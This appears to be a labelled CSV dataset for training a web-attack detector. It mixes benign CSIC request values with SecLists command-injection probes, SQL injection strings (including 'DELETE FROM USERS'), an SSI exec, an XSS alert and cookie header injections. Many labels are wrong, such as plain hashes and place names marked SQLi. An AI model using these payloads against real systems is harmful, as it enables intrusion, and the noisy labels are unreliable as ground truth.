payload,label,source
F1850CE9DDC9774187B8D8B3C15641FF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
precio,Normal,csic_gsi:cisc_normalTraffic_test.txt
ermanno,Normal,csic_gsi:cisc_normalTraffic_train.txt
Sotragero,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D3A8012E125B63AFD08D0F3768B6F37C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F85039D42585540C58D1B28A581B2D8E,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=emmye&pwd=pis6r&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
irissou,Normal,csic_gsi:cisc_normalTraffic_train.txt
74799380E,Normal,csic_gsi:cisc_normalTraffic_train.txt
228D59D07CF9774601F13EC2F59DC95A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Del+Campillo+Aranda,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B1FBC53E49D161901E70EFE07BAA676F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%3B%20str%3D%24%28echo%20DHYUHH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
5466,Normal,csic_gsi:cisc_normalTraffic_test.txt
207617CFEEC7DAF25AD1B09A31CA7F18,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20GOUIRV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
7361882A64DF6D2FB789FB81FAEDB343,Normal,csic_gsi:cisc_normalTraffic_test.txt
9238648938C08CE676944F129277376F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%205%20-ne%20%24%28echo%20XWHRPS%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
67A722C998720E2B9B3190CA9A7CE870,Normal,csic_gsi:cisc_normalTraffic_test.txt
mcinnis2@chinavende.ie,Normal,csic_gsi:cisc_normalTraffic_test.txt
EAFBE5C37829DFB5CA70710197AAE46E,Normal,csic_gsi:cisc_normalTraffic_test.txt
0531A8CC42FE62587083689A75F4C680,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8F268D6D283A4891E7C34B8825ED0546,Normal,csic_gsi:cisc_normalTraffic_test.txt
law@ankawaelda.au,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
48D6B05FA807FF59E9337F8599ECB462,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
thifault,Normal,csic_gsi:cisc_normalTraffic_test.txt
Valfarta,Normal,csic_gsi:cisc_normalTraffic_test.txt
3FE74A4E2771D3431803E0B6F4FF1EB5,Normal,csic_gsi:cisc_normalTraffic_train.txt
169D83C385BB76D1E7EB3AB70F19A61A,Normal,csic_gsi:cisc_normalTraffic_train.txt
D315916CFD9735F464DD7B2988E5862C,Normal,csic_gsi:cisc_normalTraffic_test.txt
30E9C6D47BB567374B38C61E56625A57,Normal,csic_gsi:cisc_normalTraffic_test.txt
A0FE97641FEBA967D1EE29E344425A3A,Normal,csic_gsi:cisc_normalTraffic_test.txt
507D2C5448B06E097756C5D1901FA4DB,Normal,csic_gsi:cisc_normalTraffic_train.txt
Santib��ez+del+Val,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2519318826209754,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
81FB22768DF062794284ED418EDE1F9A,Normal,csic_gsi:cisc_normalTraffic_train.txt
Medey,Normal,csic_gsi:cisc_normalTraffic_train.txt
"A�adir+al+carrito<!--#EXEC+cmd=""ls+/""-->",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
51A89F7AB2645B4A79DDE38E7AB5CF3F,Normal,csic_gsi:cisc_normalTraffic_test.txt
C01C6038003589F50241642B82A7B7F4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=englert&pwd=75n63d25&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
8F3DBB2237BB973B5C20A7C40CAD62E0,Normal,csic_gsi:cisc_normalTraffic_train.txt
Rosmida,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2AF77C3B343492A87CE8692404A60876,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%201%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
65763257R,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1A53076F857083B28405076CF2D5F789,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E6D0031ED51D9CDA5D72464F5D01C108,Normal,csic_gsi:cisc_normalTraffic_train.txt
95A67261E92F34B83F07DC9F5430D81D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Urbanizacion+Residencial+Ronda+36+9?B,SQLi,community:payloads_seed
20BAA21E4D13D69D585E52F973285508,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5A5FBF31CD2D84293CC3B2AFDD6DD2B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
CD11ADDF9F79466D36819712398A9FCD,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20BGUGCF%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
F474028D951C1C93EEE2A3FE1E38179A,Normal,csic_gsi:cisc_normalTraffic_test.txt
820017B8B9FFA29F7DD2D7E0C9252ADF,Normal,csic_gsi:cisc_normalTraffic_train.txt
41CF25358073E0F8AD877A914A25DFB7,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Paduleta,+118,+7C",Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20IBOOVB%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
deshosped20a,Normal,csic_gsi:cisc_normalTraffic_test.txt
C171C677BB5A5B78A6F3371F5946346D,Normal,csic_gsi:cisc_normalTraffic_test.txt
600724D639E4A7E72C8CAA40DFAFC4CE,Normal,csic_gsi:cisc_normalTraffic_train.txt
FAE02CB4AF1D41BD4BD42521D3EFA3F2,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=7301&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Real+de+la+Jara,+El",Normal,csic_gsi:cisc_normalTraffic_test.txt
DBDFD4541FEDFF3F073777055484466C,Normal,csic_gsi:cisc_normalTraffic_test.txt
sone@tristanyvioletina.nf,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
+jay,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2CEF6878EA918BF1F72BC3F276EEA852,Normal,csic_gsi:cisc_normalTraffic_test.txt
"%26echo%20RROLAU$((57%2B22))$(echo%20RROLAU)RROLAU""",CMD,seclists_cmd
47CB6AF01DFF6981F2412ACCF1FC5D36,Normal,csic_gsi:cisc_normalTraffic_train.txt
124D7EEC5B65ADB0DC0E3736E1D124C7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20OKMZVE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
CE88E61EEAE0FC9A3DDE692F8C778779,Normal,csic_gsi:cisc_normalTraffic_test.txt
F44E36A9E63D6E22A0449874F576B966,Normal,csic_gsi:cisc_normalTraffic_train.txt
7907DF8BF26607E411C628966CB3233F,Normal,csic_gsi:cisc_normalTraffic_test.txt
Ant�,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WGVBBV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
5A79A80540A44E45DCA60897F7538895,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3BAF7344E3361E69AF5B69706FCC4741,Normal,csic_gsi:cisc_normalTraffic_train.txt
8ADD02B5325CB1C245EF5BA70BDD5907,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
dimitri@farma-job.gl,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20PGAQQT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
80D0EB5706E0CAD3EF9359A34EA47E3A,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%3B%20str%3D%24%28echo%20TBXNEW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
7B132FA784A1B5219D9B84E9137DCDFE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
73280026W,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DE3D8608312EF0D377D89DCB8187ADD2,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%7C%20%5B%207%20-ne%20%24%28echo%20OYYPMX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
349D0984F3A035F58781AD644D1D0FA1,Normal,csic_gsi:cisc_normalTraffic_train.txt
Argentona,Normal,csic_gsi:cisc_normalTraffic_test.txt
81E0833EEEE76622FF7363CA76F95D1A,Normal,csic_gsi:cisc_normalTraffic_test.txt
8041,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
33394,Normal,csic_gsi:cisc_normalTraffic_test.txt
16929821G,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""%3Becho%20XKMIXJ$((55%2B55))$(echo%20XKMIXJ)XKMIXJ",CMD,seclists_cmd
&echo$IFSPSIGPS$((6%2B9))$(echo$IFSPSIGPS)PSIGPS%27,CMD,seclists_cmd
;echo%20IBYDJK$((27%2B85))$(echo%20IBYDJK)IBYDJK%22,CMD,seclists_cmd
39C3F07B19D1DF54F4DDBD645D6C83B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login='prup+is&password=8o4cu6a&nombre=Liber&apellidos=Sanges+Andr�u&email=benaderet@introito.io&dni=27978102M&direccion=Paseo+Virgen+Del+Rocio+160+8?D&ciudad=Garganta+de+los+Montes&cp=50867&provincia=Segovia&ntc=4002449133288786&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F97649376FE4926DB2DF6330047333EF,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Minguez,+98+",Normal,csic_gsi:cisc_normalTraffic_train.txt
7B793F044C58DCB83DF3BF64BB4414E3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
524408DA775391F07A977C19639AF779,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""".print(`echo%20MKBEZC\necho%20$((61%2B47))\necho%20MKBEZC\necho%20MKBEZC`)%3B//MKBEZC",CMD,seclists_cmd
id=1&nombre=Vino+Rioja&precio=39&cantidad=28&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
6A030396DC9B761043626692A76B68D2,Normal,csic_gsi:cisc_normalTraffic_train.txt
FE334C10D36747AE1329BD6CB428E6F8,Normal,csic_gsi:cisc_normalTraffic_test.txt
16646,Normal,csic_gsi:cisc_normalTraffic_train.txt
Caballar,Normal,csic_gsi:cisc_normalTraffic_test.txt
errorMsg=Credenciales+incorrectas'+DELETE+FROM+USERS,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Santa+Eufemia+del+Barco,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=adelaide&password=cimorro&nombre=Adirano&apellidos=Orom�+Videaux&email=racache@velaconsultores.mil&dni=48083550A&direccion=Pasaje+Cox+194,+5?F&ciudad=Campanario&cp=19140&provincia=Vizcaya&ntc=2945760463066879&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
22975080N,Normal,csic_gsi:cisc_normalTraffic_test.txt
janenna,Normal,csic_gsi:cisc_normalTraffic_train.txt
44AA601BFC655FB82ECD70C655BE8F5B,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%7C%20%5B%202%20-ne%20%24%28echo%20GQBAPT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,CMD,seclists_cmd
"C/+De+Santa+Ana,+150,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
95E67133708D37C56D6DB62AE692946A,Normal,csic_gsi:cisc_normalTraffic_test.txt
BBFAD5663FAA7E5B58CB42F2CFCAC7A1,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Travesia+Echavacoiz+Alto,+108,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo='+AND+'1'='1&precio=7625&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20FUFPKN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20BYUJUS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
820F14D18D22B99813B2F3CA092E02BF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
612AF327CBA81127DE0C61749CDEB331,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26echo%20NQPWBV$((16%2B77))$(echo%20NQPWBV)NQPWBV,CMD,seclists_cmd
stavro,Normal,csic_gsi:cisc_normalTraffic_train.txt
395C96A1A2F9F9EBBE23B3708E57BB25,Normal,csic_gsi:cisc_normalTraffic_test.txt
F243384FC96911B97EF332DC830E6856,Normal,csic_gsi:cisc_normalTraffic_test.txt
29166964A41EF4348EA40D016522C4F4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
49100388B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
636566B7C16FA30D5E24A17AF966FEE3,Normal,csic_gsi:cisc_normalTraffic_train.txt
79928493C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8D7FAD48256DBF450220304199A0FE96,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1C2EB2DA396D7DF7F150FDB29F64350E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
33B88A9750896C0F5C86AF92D05B5C35,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7Cecho%20VZDOKD$((12%2B24))$(echo%20VZDOKD)VZDOKD%7C,CMD,seclists_cmd
"Calle+Salines,+S/N+",Normal,csic_gsi:cisc_normalTraffic_test.txt
3EB78F5AFAF060E7693F1254864DD94B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=enno&password=8uNtu7s6&nombre=Emerio&apellidos=Segovia&email=schaffner@mediacar.ck&dni=31237989X&direccion=Cami+Cal+Notari,+113,+3-C&ciudad=Mas+de+las+Matas&cp=37183&provincia=Zaragoza&ntc=5691189778141307&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
&echo$IFSUTUDJC$((16%2B78))$(echo$IFSUTUDJC)UTUDJC//,CMD,seclists_cmd
11552656D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5A56490C4ED9D91D38D60116629C77B8,Normal,csic_gsi:cisc_normalTraffic_test.txt
D72A4BFFA92FD21E477BC96581C9981F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%3B%20str%3D%24%28echo%20BBUDLO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
50BC3B22D3AE5DFB17198F22FB86835F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20FNSLEC%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,CMD,seclists_cmd
6623034227955439,Normal,csic_gsi:cisc_normalTraffic_test.txt
1286F47002944EA64F1DC3D97CE7142E,Normal,csic_gsi:cisc_normalTraffic_test.txt
A9ADC4EF87E91EFDB03664961598D12A,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=garek&pwd=a9terisc9&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
DA8BEC45D046A02079354DA2438AD7E0,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%208%20-ne%20%24%28echo%20SQHKCG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
593E419C49A527F663D02A036EFF1DA3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Lucio,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=gerry&password=7o6a3&nombre=Cesaria&apellidos=Vegueria+Surinyac&email=gynt-wyle1@underdog.bz&dni=59359772S&direccion=Pasifae,+193,+6?H&ciudad=Li�dena&cp=46716&provincia=Badajoz&ntc=4436105787795323&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%203%20-ne%20%24%28echo%20KBOHVQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,CMD,seclists_cmd
%2522%7C%20%5B%205%20-ne%20%24%28echo%20EHUILY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,CMD,seclists_cmd
88A1356DAFCD8D9403908EB5F3D77772,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=arnott&password=badalon�s&nombre=N�stor&apellidos=Guim&email=hawdon@sunglasses.nom.in&dni=72047562Q&direccion=C/+Ateinsa+11,+&ciudad=Uleila+del+Campo&cp=10133&provincia=C�ceres&ntc=1230998117109240&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
6F333DC79D8F33301B71919EF43A4F09,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VAVICY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
31293475C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""%20echo%20WVCQTP$((98%2B15))$(echo%20WVCQTP)WVCQTP&",CMD,seclists_cmd
9A18FBACC0D8EBBDC8A7CD125DA1C85D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""&echo$IFSWZXINW$((50%2B11))$(echo$IFSWZXINW)WZXINW\",CMD,seclists_cmd
%3B%20str%3D%24%28echo%20QIIKMD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
DDDB1F4FDCE812742B802554C7637B32,Normal,csic_gsi:cisc_normalTraffic_test.txt
E6D3DFB7FA4674B17D83B1001461177D,Normal,csic_gsi:cisc_normalTraffic_train.txt
8C40C83D0E0DE36A22BFC1C52A1DF2A8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
trilito,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=leoine&password=ceIBO&nombre=Romina&apellidos=Weintraub&email=cathey@100mbps.gs&dni=34081266G&direccion=C/+Curadero,+101,+12?E&ciudad=Cabrillas&cp=28430&provincia=Sevilla&ntc=1059231645093194&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
'%3Becho%20LMKOMS$((85%2B51))$(echo%20LMKOMS)LMKOMS,CMD,seclists_cmd
E36FB5FC62859A2D9CD5E7E3FD64FE0E,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Vino+Rioja&precio=85&cantidad=81&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
geksong,Normal,csic_gsi:cisc_normalTraffic_test.txt
Matar�+I�iguez,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
;echo$IFSSKFBVG$((56%2B51))$(echo$IFSSKFBVG)SKFBVG%26,SQLi,community:payloads_seed
4C5D3A8577B426A503C0D070F8B3BB25,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
848868523325038A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=7525&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=cupid&pwd=%20&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C503F7FF054D49FAAF9E73AFFDC6174C,Normal,csic_gsi:cisc_normalTraffic_test.txt
VoRtigInosA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C5C7E528F364A06F49579F132A0ECBB1,Normal,csic_gsi:cisc_normalTraffic_test.txt
4E3D7899C3D9A97A4A404BA27F8D21DE,Normal,csic_gsi:cisc_normalTraffic_test.txt
24DE01046C404EABC42C709B72D8B00A,Normal,csic_gsi:cisc_normalTraffic_train.txt
Ruanes,Normal,csic_gsi:cisc_normalTraffic_test.txt
);}print(`echo%20MUNABZ`.`echo%20$((46%2B73))`.`echo%20MUNABZ`.`echo%20MUNABZ`)%3B//MUNABZ,CMD,seclists_cmd
Arroldo,Normal,csic_gsi:cisc_normalTraffic_train.txt
726CE051EEAC08051650EF586BA79DAB,Normal,csic_gsi:cisc_normalTraffic_train.txt
estantalar,Normal,csic_gsi:cisc_normalTraffic_train.txt
16464,Normal,csic_gsi:cisc_normalTraffic_test.txt
Pasar+por+cajaSet-cookie%3A+Tamper%3D1041264011025374727,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D4F524D0493443F1C6A493EF00616CB6,Normal,csic_gsi:cisc_normalTraffic_train.txt
6702CCB3C339818A76F14368845D8D50,Normal,csic_gsi:cisc_normalTraffic_train.txt
3031BE4E7335B3198B84B9C95AF59A86,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=dickens&password=requeridor&nombre=Bertilda&apellidos=Scampini+Benito&emailA=bevens@elbauldelosrefranes.gov&dni=25301830J&direccion=Avinguda+Joan+March,+14,+&ciudad=G�jar&cp=11630&provincia=Las+Palmas&ntc=4290013346826591&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
cherida,Normal,csic_gsi:cisc_normalTraffic_test.txt
07810,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=mototsun&password=longitudinalmente&nombre=Pedro&apellidos=_Bignes+Crisp�&email=thrush_orhonsay6@aadsl.no&dni=23532443Q&direccion=C/+Polacas,+59+1?F&ciudad=Cubo+de+Bureba&cp=12170&provincia=Salamanca&ntc=6489953845851590&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ACF18A654E23D7669242B53B87D7EFEC,Normal,csic_gsi:cisc_normalTraffic_train.txt
36517BA0067382D8C80269E09B0B9408,Normal,csic_gsi:cisc_normalTraffic_test.txt
mckinney,Normal,csic_gsi:cisc_normalTraffic_test.txt
3835DCB3EAA0E17CD66A659948ABA3F3,Normal,csic_gsi:cisc_normalTraffic_test.txt
Due�as+Cristaldo,Normal,csic_gsi:cisc_normalTraffic_train.txt
9D7FF02B6054A1509A5F1480642A5D37,Normal,csic_gsi:cisc_normalTraffic_train.txt
8EBD4B48C88E73610195A79FA1695979,Normal,csic_gsi:cisc_normalTraffic_test.txt
CB70CFFBA6D09AA8E7257CB3B84E9D0C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0A%20str%3D%24%28echo%20HFODHQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
FB998B88243D3A52D6CA2396A5A99A9D,Normal,csic_gsi:cisc_normalTraffic_test.txt
mantela-do,Normal,csic_gsi:cisc_normalTraffic_train.txt
rajala,Normal,csic_gsi:cisc_normalTraffic_test.txt
130c�,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Rossi+Woolrich,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2125ACF700DC80887E899C8565B9A2D2,Normal,csic_gsi:cisc_normalTraffic_train.txt
B2=any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
866C0AC17C35482AA2CC85320CCB3D64,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""%20echo%20CTFTCJ$((80%2B91))$(echo%20CTFTCJ)CTFTCJ|",CMD,seclists_cmd
03089,Normal,csic_gsi:cisc_normalTraffic_test.txt
nepor-leonov@telogis.bn,Normal,csic_gsi:cisc_normalTraffic_train.txt
007ED03F931E0E0BD98A7BCB73BA259E,Normal,csic_gsi:cisc_normalTraffic_test.txt
26E40A68DCF78D275EB9E1084F70F424,Normal,csic_gsi:cisc_normalTraffic_train.txt
19336,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%205%20-ne%20%24%28echo%20SBHMIY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
Payseo+El_gueta,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DABF7B23305B0A918A823D63925B15D9,Normal,csic_gsi:cisc_normalTraffic_train.txt
5B656023F2A2BBA225251D97B44B8EFE,Normal,csic_gsi:cisc_normalTraffic_train.txt
Halim,Normal,csic_gsi:cisc_normalTraffic_train.txt
0B9D8E8771B52FD5DFB87A110FF56355,Normal,csic_gsi:cisc_normalTraffic_train.txt
BA8E2A191168D7EE5DA70C9512FC86AD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4067,Normal,csic_gsi:cisc_normalTraffic_train.txt
